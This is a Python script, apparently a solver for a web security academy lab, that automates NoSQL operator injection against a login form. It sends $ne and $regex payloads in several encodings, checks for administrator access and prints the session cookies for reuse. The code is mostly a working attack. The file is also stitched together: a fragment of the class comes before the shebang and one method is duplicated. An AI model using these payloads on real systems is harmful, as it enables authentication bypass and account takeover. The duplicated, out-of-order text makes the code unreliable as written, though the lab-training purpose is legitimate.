def extract_title(self, html):
        """Extract page title for debugging"""
        soup = BeautifulSoup(html, 'html.parser')
        title = soup.find('title')
        return title.text.strip() if title else "No title found"
    
    def analyze_login_form(self):
        """Analyze the login form structure"""
        login_url = urljoin(self.base_url, '/login')
        
        try:
            response = self.session.get(login_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find login form
            login_form = soup.find('form')
            if login_form:
                print(f"[*] Login form analysis:")
                print(f"    Method: {login_form.get('method', 'GET').upper()}")
                print(f"    Action: {login_form.get('action', '/login')}")
                print(f"    Enctype: {login_form.get('enctype', 'application/x-www-form-urlencoded')}")
                
                # Find input fields
                inputs = login_form.find_all('input')
                print(f"    Input fields:")
                for inp in inputs:
                    field_type = inp.get('type', 'text')
                    field_name = inp.get('name', 'unnamed')
                    field_value = inp.get('value', '')
                    print(f"      {field_name}: {field_type} = '{field_value}'")
                
                return True
        except Exception as e:
            print(f"[-] Error analyzing login form: {e}")
        
        return False#!/usr/bin/env python3
"""
NoSQL Injection Lab Solver - Enhanced Version
Target: Exploiting NoSQL operator injection to bypass authentication
Author: Shadow Junior (Bhanu Guragain)
"""

import requests
import json
import re
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup

class NoSQLInjectionSolver:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        })
        self.csrf_token = None
        
    def get_csrf_token(self, response_text):
        """Extract CSRF token from response"""
        soup = BeautifulSoup(response_text, 'html.parser')
        csrf_input = soup.find('input', {'name': 'csrf'})
        if csrf_input:
            return csrf_input.get('value')
        return None
    
    def test_connection(self):
        """Test if the target is reachable"""
        try:
            response = self.session.get(self.base_url, timeout=10)
            print(f"[+] Target reachable: {response.status_code}")
            print(f"[+] Title: {self.extract_title(response.text)}")
            return True
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            return False
    
    def analyze_login_form(self):
        """Analyze the login form structure"""
        login_url = urljoin(self.base_url, '/login')
        
        try:
            response = self.session.get(login_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find login form
            login_form = soup.find('form')
            if login_form:
                print(f"[*] Login form analysis:")
                print(f"    Method: {login_form.get('method', 'GET').upper()}")
                print(f"    Action: {login_form.get('action', '/login')}")
                print(f"    Enctype: {login_form.get('enctype', 'application/x-www-form-urlencoded')}")
                
                # Find input fields
                inputs = login_form.find_all('input')
                print(f"    Input fields:")
                for inp in inputs:
                    field_type = inp.get('type', 'text')
                    field_name = inp.get('name', 'unnamed')
                    field_value = inp.get('value', '')
                    print(f"      {field_name}: {field_type} = '{field_value}'")
                
                return True
        except Exception as e:
            print(f"[-] Error analyzing login form: {e}")
        
        return False
    
    def normal_login(self, username, password):
        """Perform normal login to understand the request structure"""
        login_url = urljoin(self.base_url, '/login')
        
        # Get login page first
        login_page = self.session.get(login_url)
        print(f"[*] Login page status: {login_page.status_code}")
        
        # Extract CSRF token if present
        self.csrf_token = self.get_csrf_token(login_page.text)
        if self.csrf_token:
            print(f"[*] CSRF token found: {self.csrf_token[:20]}...")
        
        # Prepare login data
        login_data = {
            'username': username,
            'password': password
        }
        
        # Add CSRF token if present
        if self.csrf_token:
            login_data['csrf'] = self.csrf_token
        
        # Perform login
        response = self.session.post(login_url, data=login_data, allow_redirects=False)
        
        print(f"[*] Normal login attempt ({username}:{password}):")
        print(f"    Status: {response.status_code}")
        print(f"    Response length: {len(response.text)}")
        
        if response.status_code == 302:
            print(f"    Redirect location: {response.headers.get('Location', 'N/A')}")
        
        return response
    
    def nosql_injection_bypass(self):
        """Exploit NoSQL injection following the lab solution steps"""
        login_url = urljoin(self.base_url, '/login')
        
        # Get fresh login page for each attempt
        login_page = self.session.get(login_url)
        self.csrf_token = self.get_csrf_token(login_page.text)
        
        # Step-by-step payload testing as per lab solution
        payloads = [
            {
                'username': '{"$ne":""}',
                'password': 'peter',
                'description': 'Step 1: $ne operator with known password'
            },
            {
                'username': '{"$regex":"wien.*"}',
                'password': 'peter',
                'description': 'Step 2: $regex operator matching wiener'
            },
            {
                'username': '{"$ne":""}',
                'password': '{"$ne":""}',
                'description': 'Step 3: Double $ne bypass (multiple users)'
            },
            {
                'username': '{"$regex":"admin.*"}',
                'password': '{"$ne":""}',
                'description': 'Step 4: Target admin user with regex'
            }
        ]
        
        for i, payload in enumerate(payloads, 1):
            print(f"\n[*] Testing Payload {i}: {payload['description']}")
            print(f"    Username: {payload['username']}")
            print(f"    Password: {payload['password']}")
            
            # Test different content types and encoding methods
            test_methods = [
                {
                    'method': 'URL-encoded form data',
                    'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
                    'data_func': lambda u, p, csrf: self.prepare_form_data(u, p, csrf)
                },
                {
                    'method': 'JSON payload',
                    'headers': {'Content-Type': 'application/json'},
                    'data_func': lambda u, p, csrf: self.prepare_json_data(u, p, csrf)
                },
                {
                    'method': 'Raw JSON in form field',
                    'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
                    'data_func': lambda u, p, csrf: self.prepare_raw_json_form(u, p, csrf)
                }
            ]
            
            for method in test_methods:
                print(f"    Trying: {method['method']}")
                
                # Prepare request data based on method
                try:
                    request_data = method['data_func'](payload['username'], payload['password'], self.csrf_token)
                    
                    # Set headers for this request
                    headers = self.session.headers.copy()
                    headers.update(method['headers'])
                    
                    # Send request
                    if method['method'] == 'JSON payload':
                        response = self.session.post(login_url, json=request_data, headers=headers, allow_redirects=False)
                    else:
                        response = self.session.post(login_url, data=request_data, headers=headers, allow_redirects=False)
                    
                    print(f"      Status: {response.status_code}")
                    print(f"      Response length: {len(response.text)}")
                    
                    # Check for success indicators
                    if response.status_code == 302:
                        redirect_location = response.headers.get('Location', '')
                        print(f"      Redirect: {redirect_location}")
                        
                        # Check if this is the admin login we're looking for
                        if 'admin' in payload['username'].lower() or i == 4:
                            print(f"[+] SUCCESS: Admin authentication bypassed!")
                            
                            # Follow redirect to complete login
                            if redirect_location:
                                if redirect_location.startswith('/'):
                                    redirect_url = urljoin(self.base_url, redirect_location)
                                else:
                                    redirect_url = redirect_location
                                
                                final_response = self.session.get(redirect_url)
                                print(f"      Final page status: {final_response.status_code}")
                                print(f"      Final page title: {self.extract_title(final_response.text)}")
                                
                                return final_response
                        else:
                            print(f"[+] Login successful but not admin user")
                            break  # Move to next payload
                    
                    elif response.status_code == 200:
                        # Check response content for success indicators
                        if self.check_authentication_success(response):
                            print(f"[+] SUCCESS: Authentication successful!")
                            if 'admin' in payload['username'].lower() or i == 4:
                                print(f"[+] Admin access obtained!")
                                return response
                            else:
                                print(f"[+] Login successful but not admin user")
                                break  # Move to next payload
                    
                    # If we get here, this method failed
                    if response.status_code == 400:
                        print(f"      Error: Bad request - payload rejected")
                    elif "Invalid username or password" in response.text:
                        print(f"      Error: Invalid credentials")
                    
                except Exception as e:
                    print(f"      Exception: {e}")
                    continue
        
        return None
    
    def prepare_form_data(self, username, password, csrf_token):
        """Prepare standard form data"""
        data = {
            'username': username,
            'password': password
        }
        if csrf_token:
            data['csrf'] = csrf_token
        return data
    
    def prepare_json_data(self, username, password, csrf_token):
        """Prepare JSON data"""
        data = {
            'username': username,
            'password': password
        }
        if csrf_token:
            data['csrf'] = csrf_token
        return data
    
    def prepare_raw_json_form(self, username, password, csrf_token):
        """Prepare form data with raw JSON strings"""
        # Try to parse and reconstruct the JSON to ensure proper format
        try:
            username_obj = json.loads(username) if username.startswith('{') else username
            password_obj = json.loads(password) if password.startswith('{') else password
        except:
            username_obj = username
            password_obj = password
        
        data = {
            'username': json.dumps(username_obj) if isinstance(username_obj, dict) else username,
            'password': json.dumps(password_obj) if isinstance(password_obj, dict) else password
        }
        if csrf_token:
            data['csrf'] = csrf_token
        return data
    
    def check_admin_access(self):
        """Verify we have admin access and extract session details"""
        print(f"\n[*] Verifying admin access...")
        
        # Check current page content
        current_page = self.session.get(self.base_url)
        page_content = current_page.text.lower()
        
        # Look for admin indicators
        admin_indicators = [
            'administrator',
            'admin panel',
            'welcome administrator',
            'admin',
            'my account'
        ]
        
        found_indicators = []
        for indicator in admin_indicators:
            if indicator in page_content:
                found_indicators.append(indicator)
        
        if found_indicators:
            print(f"[+] Admin indicators found: {found_indicators}")
        
        # Extract and display session cookies
        cookies = self.session.cookies.get_dict()
        if cookies:
            print(f"[+] Session cookies:")
            for name, value in cookies.items():
                print(f"    {name}: {value}")
        
        # Try common admin endpoints
        admin_endpoints = [
            '/admin',
            '/administrator',
            '/my-account',
            '/account'
        ]
        
        for endpoint in admin_endpoints:
            try:
                response = self.session.get(urljoin(self.base_url, endpoint))
                if response.status_code == 200 and 'admin' in response.text.lower():
                    print(f"[+] Admin endpoint accessible: {endpoint}")
                    return True
            except:
                continue
        
        # Check if we're logged in as admin by looking at current page
        if any(indicator in page_content for indicator in ['administrator', 'admin']):
            return True
        
        return False
    
    def generate_browser_url(self):
        """Generate URL for browser access"""
        cookies = self.session.cookies.get_dict()
        if cookies:
            print(f"\n[+] Browser access information:")
            print(f"    URL: {self.base_url}")
            print(f"    Cookies to set:")
            for name, value in cookies.items():
                print(f"      {name}={value}")
        
        return self.base_url
    
    def solve_lab(self):
        """Main method to solve the lab"""
        print("="*70)
        print("NoSQL Injection Lab Solver - Enhanced Version")
        print("Target: Exploiting NoSQL operator injection to bypass authentication")
        print("="*70)
        
        # Test connection
        if not self.test_connection():
            return False
        
        # Analyze login form structure
        print(f"\n[*] Analyzing login form structure...")
        self.analyze_login_form()
        
        # Step 1: Test normal login (optional but informative)
        print(f"\n[*] Testing normal login first...")
        self.normal_login('wiener', 'peter')
        
        # Step 2: Exploit NoSQL injection
        print(f"\n[*] Attempting NoSQL injection exploitation...")
        success_response = self.nosql_injection_bypass()
        
        if success_response:
            # Step 3: Verify admin access
            if self.check_admin_access():
                print(f"\n[+] Lab solved successfully!")
                print(f"[+] Administrator access obtained!")
                
                # Generate browser URL
                browser_url = self.generate_browser_url()
                print(f"\n[+] Access the lab in browser at: {browser_url}")
                
                return True
            else:
                print(f"[!] Authentication bypassed but admin access not confirmed")
                print(f"[!] Check the current page content manually")
        else:
            print(f"[-] Failed to bypass authentication")
        
        return False

def main():
    # Target URL from the lab (update this with your current lab URL)
    target_url = "https://0af4003903e5210780d70d0100e30080.web-security-academy.net/"
    
    print("Starting NoSQL Injection Lab Solver...")
    print(f"Target: {target_url}")
    
    solver = NoSQLInjectionSolver(target_url)
    
    if solver.solve_lab():
        print("\n" + "="*70)
        print("SUCCESS: Lab completed!")
        print("You should now be logged in as administrator")
        print("="*70)
    else:
        print("\n" + "="*70)
        print("FAILED: Could not solve lab")
        print("Check the output above for debugging information")
        print("="*70)

if __name__ == "__main__":
    main()
